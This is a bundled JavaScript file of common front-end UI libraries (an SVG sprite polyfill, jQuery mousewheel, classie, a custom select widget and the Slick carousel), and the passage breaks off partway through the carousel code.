!(function (t, e) {
    "function" == typeof define && define.amd
        ? define([], function () {
              return (t.svg4everybody = e());
          })
        : "object" == typeof exports
        ? (module.exports = e())
        : (t.svg4everybody = e());
})(this, function () {
    function t(t, e) {
        if (e) {
            var i = document.createDocumentFragment(),
                n = !t.getAttribute("viewBox") && e.getAttribute("viewBox");
            n && t.setAttribute("viewBox", n);
            for (var s = e.cloneNode(!0); s.childNodes.length; ) i.appendChild(s.firstChild);
            t.appendChild(i);
        }
    }
    function e(e) {
        (e.onreadystatechange = function () {
            if (4 === e.readyState) {
                var i = e._cachedDocument;
                i || (((i = e._cachedDocument = document.implementation.createHTMLDocument("")).body.innerHTML = e.responseText), (e._cachedTarget = {})),
                    e._embeds.splice(0).map(function (n) {
                        var s = e._cachedTarget[n.id];
                        s || (s = e._cachedTarget[n.id] = i.getElementById(n.id)), t(n.svg, s);
                    });
            }
        }),
            e.onreadystatechange();
    }
    return function (i) {
        var n,
            s = Object(i);
        n =
            "polyfill" in s
                ? s.polyfill
                : /\bTrident\/[567]\b|\bMSIE (?:9|10)\.0\b/.test(navigator.userAgent) || (navigator.userAgent.match(/\bEdge\/12\.(\d+)\b/) || [])[1] < 10547 || (navigator.userAgent.match(/\bAppleWebKit\/(\d+)\b/) || [])[1] < 537;
        var r = {},
            o = window.requestAnimationFrame || setTimeout,
            a = document.getElementsByTagName("use");
        n &&
            (function i() {
                for (var l = 0; l < a.length; ) {
                    var h = a[l],
                        u = h.parentNode;
                    if (u && /svg/i.test(u.nodeName)) {
                        var c = h.getAttribute("xlink:href");
                        if (n && (!s.validate || s.validate(c, u, h))) {
                            u.removeChild(h);
                            var d = c.split("#"),
                                f = d.shift(),
                                p = d.join("#");
                            if (f.length) {
                                var g = r[f];
                                g || ((g = r[f] = new XMLHttpRequest()).open("GET", f), g.send(), (g._embeds = [])), g._embeds.push({ svg: u, id: p }), e(g);
                            } else t(u, document.getElementById(p));
                        }
                    } else ++l;
                }
                o(i, 67);
            })();
    };
}),
    (function (t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? (module.exports = t) : t(jQuery);
    })(function (t) {
        var e,
            i,
            n = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
            s = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
            r = Array.prototype.slice;
        if (t.event.fixHooks) for (var o = n.length; o; ) t.event.fixHooks[n[--o]] = t.event.mouseHooks;
        var a = (t.event.special.mousewheel = {
            version: "3.1.12",
            setup: function () {
                if (this.addEventListener) for (var e = s.length; e; ) this.addEventListener(s[--e], l, !1);
                else this.onmousewheel = l;
                t.data(this, "mousewheel-line-height", a.getLineHeight(this)), t.data(this, "mousewheel-page-height", a.getPageHeight(this));
            },
            teardown: function () {
                if (this.removeEventListener) for (var e = s.length; e; ) this.removeEventListener(s[--e], l, !1);
                else this.onmousewheel = null;
                t.removeData(this, "mousewheel-line-height"), t.removeData(this, "mousewheel-page-height");
            },
            getLineHeight: function (e) {
                var i = t(e),
                    n = i["offsetParent" in t.fn ? "offsetParent" : "parent"]();
                return n.length || (n = t("body")), parseInt(n.css("fontSize"), 10) || parseInt(i.css("fontSize"), 10) || 16;
            },
            getPageHeight: function (e) {
                return t(e).height();
            },
            settings: { adjustOldDeltas: !0, normalizeOffset: !0 },
        });
        function l(n) {
            var s,
                o = n || window.event,
                l = r.call(arguments, 1),
                c = 0,
                d = 0,
                f = 0,
                p = 0,
                g = 0;
            if (
                (((n = t.event.fix(o)).type = "mousewheel"),
                "detail" in o && (f = -1 * o.detail),
                "wheelDelta" in o && (f = o.wheelDelta),
                "wheelDeltaY" in o && (f = o.wheelDeltaY),
                "wheelDeltaX" in o && (d = -1 * o.wheelDeltaX),
                "axis" in o && o.axis === o.HORIZONTAL_AXIS && ((d = -1 * f), (f = 0)),
                (c = 0 === f ? d : f),
                "deltaY" in o && (c = f = -1 * o.deltaY),
                "deltaX" in o && ((d = o.deltaX), 0 === f && (c = -1 * d)),
                0 !== f || 0 !== d)
            ) {
                if (1 === o.deltaMode) {
                    var v = t.data(this, "mousewheel-line-height");
                    (c *= v), (f *= v), (d *= v);
                } else if (2 === o.deltaMode) {
                    var m = t.data(this, "mousewheel-page-height");
                    (c *= m), (f *= m), (d *= m);
                }
                if (
                    ((s = Math.max(Math.abs(f), Math.abs(d))),
                    (!i || s < i) && ((i = s), u(o, s) && (i /= 40)),
                    u(o, s) && ((c /= 40), (d /= 40), (f /= 40)),
                    (c = Math[c >= 1 ? "floor" : "ceil"](c / i)),
                    (d = Math[d >= 1 ? "floor" : "ceil"](d / i)),
                    (f = Math[f >= 1 ? "floor" : "ceil"](f / i)),
                    a.settings.normalizeOffset && this.getBoundingClientRect)
                ) {
                    var _ = this.getBoundingClientRect();
                    (p = n.clientX - _.left), (g = n.clientY - _.top);
                }
                return (
                    (n.deltaX = d),
                    (n.deltaY = f),
                    (n.deltaFactor = i),
                    (n.offsetX = p),
                    (n.offsetY = g),
                    (n.deltaMode = 0),
                    l.unshift(n, c, d, f),
                    e && clearTimeout(e),
                    (e = setTimeout(h, 200)),
                    (t.event.dispatch || t.event.handle).apply(this, l)
                );
            }
        }
        function h() {
            i = null;
        }
        function u(t, e) {
            return a.settings.adjustOldDeltas && "mousewheel" === t.type && e % 120 == 0;
        }
        t.fn.extend({
            mousewheel: function (t) {
                return t ? this.bind("mousewheel", t) : this.trigger("mousewheel");
            },
            unmousewheel: function (t) {
                return this.unbind("mousewheel", t);
            },
        });
    }),
    (function (t) {
        "use strict";
        function e(t) {
            return new RegExp("(^|\\s+)" + t + "(\\s+|$)");
        }
        var i, n, s;
        function r(t, e) {
            (i(t, e) ? s : n)(t, e);
        }
        "classList" in document.documentElement
            ? ((i = function (t, e) {
                  return t.classList.contains(e);
              }),
              (n = function (t, e) {
                  t.classList.add(e);
              }),
              (s = function (t, e) {
                  t.classList.remove(e);
              }))
            : ((i = function (t, i) {
                  return e(i).test(t.className);
              }),
              (n = function (t, e) {
                  i(t, e) || (t.className = t.className + " " + e);
              }),
              (s = function (t, i) {
                  t.className = t.className.replace(e(i), " ");
              }));
        var o = { hasClass: i, addClass: n, removeClass: s, toggleClass: r, has: i, add: n, remove: s, toggle: r };
        "function" == typeof define && define.amd ? define(o) : (t.classie = o);
    })(window),
    (function (t) {
        "use strict";
        function e(t, e) {
            for (var i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
            return t;
        }
        function i(t, i) {
            (this.el = t), (this.options = e({}, this.options)), e(this.options, i), this._init();
        }
        (i.prototype.options = {
            newTab: !0,
            stickyPlaceholder: !0,
            onChange: function (t) {
                return !1;
            },
        }),
            (i.prototype._init = function () {
                var t = this.el.options[this.el.selectedIndex];
                (this.hasDefaultPlaceholder = t && t.disabled),
                    (this.selectedOpt = t || this.el.querySelector("option")),
                    this._createSelectEl(),
                    (this.selOpts = [].slice.call(this.selEl.querySelectorAll("li[data-option]"))),
                    (this.selOptsCount = this.selOpts.length),
                    (this.current = this.selOpts.indexOf(this.selEl.querySelector("li.cs-selected")) || -1),
                    (this.selPlaceholder = this.selEl.querySelector("span.cs-placeholder")),
                    this._initEvents();
            }),
            (i.prototype._createSelectEl = function () {
                var t = "",
                    e = function (t) {
                        var e = "",
                            i = "",
                            n = "";
                        !t.selectedOpt || this.foundSelected || this.hasDefaultPlaceholder || ((i += "cs-selected "), (this.foundSelected = !0)),
                            t.getAttribute("data-class") && (i += t.getAttribute("data-class")),
                            t.getAttribute("data-link") && (n = "data-link=" + t.getAttribute("data-link")),
                            "" !== i && (e = 'class="' + i + '" ');
                        var s = "";
                        return (
                            [].forEach.call(t.attributes, function (t) {
                                var e = t.name;
                                e.indexOf("data-") + ["data-option", "data-value"].indexOf(e) == -1 && (s += e + "='" + t.value + "' ");
                            }),
                            "<li " + e + n + s + ' data-option data-value="' + t.value + '"><span>' + t.textContent + "</span></li>"
                        );
                    };
                [].slice.call(this.el.children).forEach(function (i) {
                    if (!i.disabled) {
                        var n = i.tagName.toLowerCase();
                        "option" === n
                            ? (t += e(i))
                            : "optgroup" === n &&
                              ((t += '<li class="cs-optgroup"><span>' + i.label + "</span><ul>"),
                              [].slice.call(i.children).forEach(function (i) {
                                  t += e(i);
                              }),
                              (t += "</ul></li>"));
                    }
                });
                var i = '<div class="cs-options"><ul>' + t + "</ul></div>";
                (this.selEl = document.createElement("div")),
                    (this.selEl.className = this.el.className),
                    (this.selEl.tabIndex = this.el.tabIndex),
                    (this.selEl.innerHTML = '<span class="cs-placeholder">' + this.selectedOpt.textContent + "</span>" + i),
                    this.el.parentNode.appendChild(this.selEl),
                    this.selEl.appendChild(this.el);
            }),
            (i.prototype._initEvents = function () {
                var t = this;
                this.selPlaceholder.addEventListener("click", function () {
                    t._toggleSelect();
                }),
                    this.selOpts.forEach(function (e, i) {
                        e.addEventListener("click", function () {
                            (t.current = i), t._changeOption(), t._toggleSelect();
                        });
                    }),
                    document.addEventListener("click", function (e) {
                        var i = e.target;
                        t._isOpen() &&
                            i !== t.selEl &&
                            !(function (t, e) {
                                if (!t) return !1;
                                for (var i = t.target || t.srcElement || t || !1; i && i != e; ) i = i.parentNode || !1;
                                return !1 !== i;
                            })(i, t.selEl) &&
                            t._toggleSelect();
                    }),
                    this.selEl.addEventListener("keydown", function (e) {
                        switch (e.keyCode || e.which) {
                            case 38:
                                e.preventDefault(), t._navigateOpts("prev");
                                break;
                            case 40:
                                e.preventDefault(), t._navigateOpts("next");
                                break;
                            case 32:
                                e.preventDefault(), t._isOpen() && void 0 !== t.preSelCurrent && -1 !== t.preSelCurrent && t._changeOption(), t._toggleSelect();
                                break;
                            case 13:
                                e.preventDefault(), t._isOpen() && void 0 !== t.preSelCurrent && -1 !== t.preSelCurrent && (t._changeOption(), t._toggleSelect());
                                break;
                            case 27:
                                e.preventDefault(), t._isOpen() && t._toggleSelect();
                        }
                    });
            }),
            (i.prototype._navigateOpts = function (t) {
                this._isOpen() || this._toggleSelect();
                var e = void 0 !== this.preSelCurrent && -1 !== this.preSelCurrent ? this.preSelCurrent : this.current;
                (("prev" === t && e > 0) || ("next" === t && e < this.selOptsCount - 1)) && ((this.preSelCurrent = "next" === t ? e + 1 : e - 1), this._removeFocus(), classie.add(this.selOpts[this.preSelCurrent], "cs-focus"));
            }),
            (i.prototype._toggleSelect = function () {
                this._removeFocus(),
                    console.log("3"),
                    this._isOpen()
                        ? (-1 !== this.current && (this.selPlaceholder.textContent = this.selOpts[this.current].textContent), classie.remove(this.selEl, "cs-active"))
                        : (this.hasDefaultPlaceholder && this.options.stickyPlaceholder && (this.selPlaceholder.textContent = this.selectedOpt.textContent), classie.add(this.selEl, "cs-active"));
            }),
            (i.prototype._changeOption = function () {
                void 0 !== this.preSelCurrent && -1 !== this.preSelCurrent && ((this.current = this.preSelCurrent), (this.preSelCurrent = -1));
                var e = this.selOpts[this.current];
                (this.selPlaceholder.textContent = e.textContent), (this.el.value = e.getAttribute("data-value"));
                var i = this.selEl.querySelector("li.cs-selected");
                i && classie.remove(i, "cs-selected"),
                    classie.add(e, "cs-selected"),
                    e.getAttribute("data-link") && (this.options.newTab ? t.open(e.getAttribute("data-link"), "_blank") : (t.location = e.getAttribute("data-link"))),
                    this.options.onChange(this.el.value);
            }),
            (i.prototype._isOpen = function (t) {
                return classie.has(this.selEl, "cs-active");
            }),
            (i.prototype._removeFocus = function (t) {
                var e = this.selEl.querySelector("li.cs-focus");
                e && classie.remove(e, "cs-focus");
            }),
            (t.SelectFx = i);
    })(window),
    (function (t) {
        "use strict";
        "function" == typeof define && define.amd ? define(["jquery"], t) : "undefined" != typeof exports ? (module.exports = t(require("jquery"))) : t(jQuery);
    })(function (t) {
        "use strict";
        var e,
            i = window.Slick || {};
        (e = 0),
            ((i = function (i, n) {
                var s,
                    r = this;
                (r.defaults = {
                    accessibility: !0,
                    adaptiveHeight: !1,
                    appendArrows: t(i),
                    appendDots: t(i),
                    arrows: !0,
                    asNavFor: null,
                    prevArrow: '<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',
                    nextArrow: '<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',
                    autoplay: !1,
                    autoplaySpeed: 3e3,
                    centerMode: !1,
                    centerPadding: "50px",
                    cssEase: "ease",
                    customPaging: function (e, i) {
                        return t('<button type="button" data-role="none" role="button" tabindex="0" />').text(i + 1);
                    },
                    dots: !1,
                    dotsClass: "slick-dots",
                    draggable: !0,
                    easing: "linear",
                    edgeFriction: 0.35,
                    fade: !1,
                    focusOnSelect: !1,
                    infinite: !0,
                    initialSlide: 0,
                    lazyLoad: "ondemand",
                    mobileFirst: !1,
                    pauseOnHover: !0,
                    pauseOnFocus: !0,
                    pauseOnDotsHover: !1,
                    respondTo: "window",
                    responsive: null,
                    rows: 1,
                    rtl: !1,
                    slide: "",
                    slidesPerRow: 1,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    speed: 500,
                    swipe: !0,
                    swipeToSlide: !1,
                    touchMove: !0,
                    touchThreshold: 5,
                    useCSS: !0,
                    useTransform: !0,
                    variableWidth: !1,
                    vertical: !1,
                    verticalSwiping: !1,
                    waitForAnimate: !0,
                    zIndex: 1e3,
                }),
                    (r.initials = {
                        animating: !1,
                        dragging: !1,
                        autoPlayTimer: null,
                        currentDirection: 0,
                        currentLeft: null,
                        currentSlide: 0,
                        direction: 1,
                        $dots: null,
                        listWidth: null,
                        listHeight: null,
                        loadIndex: 0,
                        $nextArrow: null,
                        $prevArrow: null,
                        slideCount: null,
                        slideWidth: null,
                        $slideTrack: null,
                        $slides: null,
                        sliding: !1,
                        slideOffset: 0,
                        swipeLeft: null,
                        $list: null,
                        touchObject: {},
                        transformsEnabled: !1,
                        unslicked: !1,
                    }),
                    t.extend(r, r.initials),
                    (r.activeBreakpoint = null),
                    (r.animType = null),
                    (r.animProp = null),
                    (r.breakpoints = []),
                    (r.breakpointSettings = []),
                    (r.cssTransitions = !1),
                    (r.focussed = !1),
                    (r.interrupted = !1),
                    (r.hidden = "hidden"),
                    (r.paused = !0),
                    (r.positionProp = null),
                    (r.respondTo = null),
                    (r.rowCount = 1),
                    (r.shouldClick = !0),
                    (r.$slider = t(i)),
                    (r.$slidesCache = null),
                    (r.transformType = null),
                    (r.transitionType = null),
                    (r.visibilityChange = "visibilitychange"),
                    (r.windowWidth = 0),
                    (r.windowTimer = null),
                    (s = t(i).data("slick") || {}),
                    (r.options = t.extend({}, r.defaults, n, s)),
                    (r.currentSlide = r.options.initialSlide),
                    (r.originalSettings = r.options),
                    void 0 !== document.mozHidden
                        ? ((r.hidden = "mozHidden"), (r.visibilityChange = "mozvisibilitychange"))
                        : void 0 !== document.webkitHidden && ((r.hidden = "webkitHidden"), (r.visibilityChange = "webkitvisibilitychange")),
                    (r.autoPlay = t.proxy(r.autoPlay, r)),
                    (r.autoPlayClear = t.proxy(r.autoPlayClear, r)),
                    (r.autoPlayIterator = t.proxy(r.autoPlayIterator, r)),
                    (r.changeSlide = t.proxy(r.changeSlide, r)),
                    (r.clickHandler = t.proxy(r.clickHandler, r)),
                    (r.selectHandler = t.proxy(r.selectHandler, r)),
                    (r.setPosition = t.proxy(r.setPosition, r)),
                    (r.swipeHandler = t.proxy(r.swipeHandler, r)),
                    (r.dragHandler = t.proxy(r.dragHandler, r)),
                    (r.keyHandler = t.proxy(r.keyHandler, r)),
                    (r.instanceUid = e++),
                    (r.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
                    r.registerBreakpoints(),
                    r.init(!0);
            }).prototype.activateADA = function () {
                this.$slideTrack.find(".slick-active").attr({ "aria-hidden": "false" }).find("a, input, button, select").attr({ tabindex: "0" });
            }),
            (i.prototype.addSlide = i.prototype.slickAdd = function (e, i, n) {
                var s = this;
                if ("boolean" == typeof i) (n = i), (i = null);
                else if (i < 0 || i >= s.slideCount) return !1;
                s.unload(),
                    "number" == typeof i
                        ? 0 === i && 0 === s.$slides.length
                            ? t(e).appendTo(s.$slideTrack)
                            : n
                            ? t(e).insertBefore(s.$slides.eq(i))
                            : t(e).insertAfter(s.$slides.eq(i))
                        : !0 === n
                        ? t(e).prependTo(s.$slideTrack)
                        : t(e).appendTo(s.$slideTrack),
                    (s.$slides = s.$slideTrack.children(this.options.slide)),
                    s.$slideTrack.children(this.options.slide).detach(),
                    s.$slideTrack.append(s.$slides),
                    s.$slides.each(function (e, i) {
                        t(i).attr("data-slick-index", e);
                    }),
                    (s.$slidesCache = s.$slides),
                    s.reinit();
            }),
            (i.prototype.animateHeight = function () {
                var t = this;
                if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
                    var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
                    t.$list.animate({ height: e }, t.options.speed);
                }
            }),
            (i.prototype.animateSlide = function (e, i) {
                var n = {},
                    s = this;
                s.animateHeight(),
                    !0 === s.options.rtl && !1 === s.options.vertical && (e = -e),
                    !1 === s.transformsEnabled
                        ? !1 === s.options.vertical
                            ? s.$slideTrack.animate({ left: e }, s.options.speed, s.options.easing, i)
                            : s.$slideTrack.animate({ top: e }, s.options.speed, s.options.easing, i)
                        : !1 === s.cssTransitions
                        ? (!0 === s.options.rtl && (s.currentLeft = -s.currentLeft),
                          t({ animStart: s.currentLeft }).animate(
                              { animStart: e },
                              {
                                  duration: s.options.speed,
                                  easing: s.options.easing,
                                  step: function (t) {
                                      (t = Math.ceil(t)), !1 === s.options.vertical ? ((n[s.animType] = "translate(" + t + "px, 0px)"), s.$slideTrack.css(n)) : ((n[s.animType] = "translate(0px," + t + "px)"), s.$slideTrack.css(n));
                                  },
                                  complete: function () {
                                      i && i.call();
                                  },
                              }
                          ))
                        : (s.applyTransition(),
                          (e = Math.ceil(e)),
                          !1 === s.options.vertical ? (n[s.animType] = "translate3d(" + e + "px, 0px, 0px)") : (n[s.animType] = "translate3d(0px," + e + "px, 0px)"),
                          s.$slideTrack.css(n),
                          i &&
                              setTimeout(function () {
                                  s.disableTransition(), i.call();
                              }, s.options.speed));
            }),
            (i.prototype.getNavTarget = function () {
                var e = this.options.asNavFor;
                return e && null !== e && (e = t(e).not(this.$slider)), e;
            }),
            (i.prototype.asNavFor = function (e) {
                var i = this.getNavTarget();
                null !== i &&
                    "object" == typeof i &&
                    i.each(function () {
                        var i = t(this).slick("getSlick");
                        i.unslicked || i.slideHandler(e, !0);
                    });
            }),
            (i.prototype.applyTransition = function (t) {
                var e = this,
                    i = {};
                !1 === e.options.fade ? (i[e.transitionType] = e.transformType + " " + e.options.speed + "ms " + e.options.cssEase) : (i[e.transitionType] = "opacity " + e.options.speed + "ms " + e.options.cssEase),
                    !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i);
            }),
            (i.prototype.autoPlay = function () {
                var t = this;
                t.autoPlayClear(), t.slideCount > t.options.slidesToShow && (t.autoPlayTimer = setInterval(t.autoPlayIterator, t.options.autoplaySpeed));
            }),
            (i.prototype.autoPlayClear = function () {
                this.autoPlayTimer && clearInterval(this.autoPlayTimer);
            }),
            (i.prototype.autoPlayIterator = function () {
                var t = this,
                    e = t.currentSlide + t.options.slidesToScroll;
                t.paused ||
                    t.interrupted ||
                    t.focussed ||
                    (!1 === t.options.infinite &&
                        (1 === t.direction && t.currentSlide + 1 === t.slideCount - 1 ? (t.direction = 0) : 0 === t.direction && ((e = t.currentSlide - t.options.slidesToScroll), t.currentSlide - 1 == 0 && (t.direction = 1))),
                    t.slideHandler(e));
            }),
            (i.prototype.buildArrows = function () {
                var e = this;
                !0 === e.options.arrows &&
                    ((e.$prevArrow = t(e.options.prevArrow).addClass("slick-arrow")),
                    (e.$nextArrow = t(e.options.nextArrow).addClass("slick-arrow")),
                    e.slideCount > e.options.slidesToShow
                        ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
                          e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
                          e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows),
                          e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows),
                          !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"))
                        : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({ "aria-disabled": "true", tabindex: "-1" }));
            }),
            (i.prototype.buildDots = function () {
                var e,
                    i,
                    n = this;
                if (!0 === n.options.dots && n.slideCount > n.options.slidesToShow) {
                    for (n.$slider.addClass("slick-dotted"), i = t("<ul />").addClass(n.options.dotsClass), e = 0; e <= n.getDotCount(); e += 1) i.append(t("<li />").append(n.options.customPaging.call(this, n, e)));
                    (n.$dots = i.appendTo(n.options.appendDots)), n.$dots.find("li").first().addClass("slick-active").attr("aria-hidden", "false");
                }
            }),
            (i.prototype.buildOut = function () {
                var e = this;
                (e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide")),
                    (e.slideCount = e.$slides.length),
                    e.$slides.each(function (e, i) {
                        t(i)
                            .attr("data-slick-index", e)
                            .data("originalStyling", t(i).attr("style") || "");
                    }),
                    e.$slider.addClass("slick-slider"),
                    (e.$slideTrack = 0 === e.slideCount ? t('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent()),
                    (e.$list = e.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent()),
                    e.$slideTrack.css("opacity", 0),
                    (!0 !== e.options.centerMode && !0 !== e.options.swipeToSlide) || (e.options.slidesToScroll = 1),
                    t("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"),
                    e.setupInfinite(),
                    e.buildArrows(),
                    e.buildDots(),
                    e.updateDots(),
                    e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0),
                    !0 === e.options.draggable && e.$list.addClass("draggable");
            }),
            (i.prototype.buildRows = function () {
                var t,
                    e,
                    i,
                    n,
                    s,
                    r,
                    o,
                    a = this;
                if (((n = document.createDocumentFragment()), (r = a.$slider.children()), a.options.rows > 1)) {
                    for (o = a.options.slidesPerRow * a.options.rows, s = Math.ceil(r.length / o), t = 0; t < s; t++) {
                        var l = document.createElement("div");
                        for (e = 0; e < a.options.rows; e++) {
                            var h = document.createElement("div");
                            for (i = 0; i < a.options.slidesPerRow; i++) {
                                var u = t * o + (e * a.options.slidesPerRow + i);
                                r.get(u) && h.appendChild(r.get(u));
                            }
                            l.appendChild(h);
                        }
                        n.appendChild(l);
                    }
                    a.$slider.empty().append(n),
                        a.$slider
                            .children()
                            .children()
                            .children()
                            .css({ width: 100 / a.options.slidesPerRow + "%", display: "inline-block" });
                }
            }),
            (i.prototype.checkResponsive = function (e, i) {
                var n,
                    s,
                    r,
                    o = this,
                    a = !1,
                    l = o.$slider.width(),
                    h = window.innerWidth || t(window).width();
                if (("window" === o.respondTo ? (r = h) : "slider" === o.respondTo ? (r = l) : "min" === o.respondTo && (r = Math.min(h, l)), o.options.responsive && o.options.responsive.length && null !== o.options.responsive)) {
                    for (n in ((s = null), o.breakpoints)) o.breakpoints.hasOwnProperty(n) && (!1 === o.originalSettings.mobileFirst ? r < o.breakpoints[n] && (s = o.breakpoints[n]) : r > o.breakpoints[n] && (s = o.breakpoints[n]));
                    null !== s
                        ? null !== o.activeBreakpoint
                            ? (s !== o.activeBreakpoint || i) &&
                              ((o.activeBreakpoint = s),
                              "unslick" === o.breakpointSettings[s] ? o.unslick(s) : ((o.options = t.extend({}, o.originalSettings, o.breakpointSettings[s])), !0 === e && (o.currentSlide = o.options.initialSlide), o.refresh(e)),
                              (a = s))
                            : ((o.activeBreakpoint = s),
                              "unslick" === o.breakpointSettings[s] ? o.unslick(s) : ((o.options = t.extend({}, o.originalSettings, o.breakpointSettings[s])), !0 === e && (o.currentSlide = o.options.initialSlide), o.refresh(e)),
                              (a = s))
                        : null !== o.activeBreakpoint && ((o.activeBreakpoint = null), (o.options = o.originalSettings), !0 === e && (o.currentSlide = o.options.initialSlide), o.refresh(e), (a = s)),
                        e || !1 === a || o.$slider.trigger("breakpoint", [o, a]);
                }
            }),
            (i.prototype.changeSlide = function (e, i) {
                var n,
                    s,
                    r = this,
                    o = t(e.currentTarget);
                switch ((o.is("a") && e.preventDefault(), o.is("li") || (o = o.closest("li")), (n = r.slideCount % r.options.slidesToScroll != 0 ? 0 : (r.slideCount - r.currentSlide) % r.options.slidesToScroll), e.data.message)) {
                    case "previous":
                        (s = 0 === n ? r.options.slidesToScroll : r.options.slidesToShow - n), r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide - s, !1, i);
                        break;
                    case "next":
                        (s = 0 === n ? r.options.slidesToScroll : n), r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide + s, !1, i);
                        break;
                    case "index":
                        var a = 0 === e.data.index ? 0 : e.data.index || o.index() * r.options.slidesToScroll;
                        r.slideHandler(r.checkNavigable(a), !1, i), o.children().trigger("focus");
                        break;
                    default:
                        return;
                }
            }),
            (i.prototype.checkNavigable = function (t) {
                var e, i;
                if (((i = 0), t > (e = this.getNavigableIndexes())[e.length - 1])) t = e[e.length - 1];
                else
                    for (var n in e) {
                        if (t < e[n]) {
                            t = i;
                            break;
                        }
                        i = e[n];
                    }
                return t;
            }),
            (i.prototype.cleanUpEvents = function () {
                var e = this;
                e.options.dots && null !== e.$dots && t("li", e.$dots).off("click.slick", e.changeSlide).off("mouseenter.slick", t.proxy(e.interrupt, e, !0)).off("mouseleave.slick", t.proxy(e.interrupt, e, !1)),
                    e.$slider.off("focus.slick blur.slick"),
                    !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide), e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide)),
                    e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler),
                    e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler),
                    e.$list.off("touchend.slick mouseup.slick", e.swipeHandler),
                    e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler),
                    e.$list.off("click.slick", e.clickHandler),
                    t(document).off(e.visibilityChange, e.visibility),
                    e.cleanUpSlideEvents(),
                    !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler),
                    !0 === e.options.focusOnSelect && t(e.$slideTrack).children().off("click.slick", e.selectHandler),
                    t(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange),
                    t(window).off("resize.slick.slick-" + e.instanceUid, e.resize),
                    t("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault),
                    t(window).off("load.slick.slick-" + e.instanceUid, e.setPosition),
                    t(document).off("ready.slick.slick-" + e.instanceUid, e.setPosition);
            }),
            (i.prototype.cleanUpSlideEvents = function () {
                var e = this;
                e.$list.off("mouseenter.slick", t.proxy(e.interrupt, e, !0)), e.$list.off("mouseleave.slick", t.proxy(e.interrupt, e, !1));
            }),
            (i.prototype.cleanUpRows = function () {
                var t;
                this.options.rows > 1 && ((t = this.$slides.children().children()).removeAttr("style"), this.$slider.empty().append(t));
            }),
            (i.prototype.clickHandler = function (t) {
                !1 === this.shouldClick && (t.stopImmediatePropagation(), t.stopPropagation(), t.preventDefault());
            }),
            (i.prototype.destroy = function (e) {
                var i = this;
                i.autoPlayClear(),
                    (i.touchObject = {}),
                    i.cleanUpEvents(),
                    t(".slick-cloned", i.$slider).detach(),
                    i.$dots && i.$dots.remove(),
                    i.$prevArrow &&
                        i.$prevArrow.length &&
                        (i.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.prevArrow) && i.$prevArrow.remove()),
                    i.$nextArrow &&
                        i.$nextArrow.length &&
                        (i.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.nextArrow) && i.$nextArrow.remove()),
                    i.$slides &&
                        (i.$slides
                            .removeClass("slick-slide slick-active slick-center slick-visible slick-current")
                            .removeAttr("aria-hidden")
                            .removeAttr("data-slick-index")
                            .each(function () {
                                t(this).attr("style", t(this).data("originalStyling"));
                            }),
                        i.$slideTrack.children(this.options.slide).detach(),
                        i.$slideTrack.detach(),
                        i.$list.detach(),
                        i.$slider.append(i.$slides)),
                    i.cleanUpRows(),
                    i.$slider.removeClass("slick-slider"),
                    i.$slider.removeClass("slick-initialized"),
                    i.$slider.removeClass("slick-dotted"),
                    (i.unslicked = !0),
                    e || i.$slider.trigger("destroy", [i]);
            }),
            (i.prototype.disableTransition = function (t) {
                var e = {};
                (e[this.transitionType] = ""), !1 === this.options.fade ? this.$slideTrack.css(e) : this.$slides.eq(t).css(e);
            }),
            (i.prototype.fadeSlide = function (t, e) {
                var i = this;
                !1 === i.cssTransitions
                    ? (i.$slides.eq(t).css({ zIndex: i.options.zIndex }), i.$slides.eq(t).animate({ opacity: 1 }, i.options.speed, i.options.easing, e))
                    : (i.applyTransition(t),
                      i.$slides.eq(t).css({ opacity: 1, zIndex: i.options.zIndex }),
                      e &&
                          setTimeout(function () {
                              i.disableTransition(t), e.call();
                          }, i.options.speed));
            }),
            (i.prototype.fadeSlideOut = function (t) {
                var e = this;
                !1 === e.cssTransitions ? e.$slides.eq(t).animate({ opacity: 0, zIndex: e.options.zIndex - 2 }, e.options.speed, e.options.easing) : (e.applyTransition(t), e.$slides.eq(t).css({ opacity: 0, zIndex: e.options.zIndex - 2 }));
            }),
            (i.prototype.filterSlides = i.prototype.slickFilter = function (t) {
                var e = this;
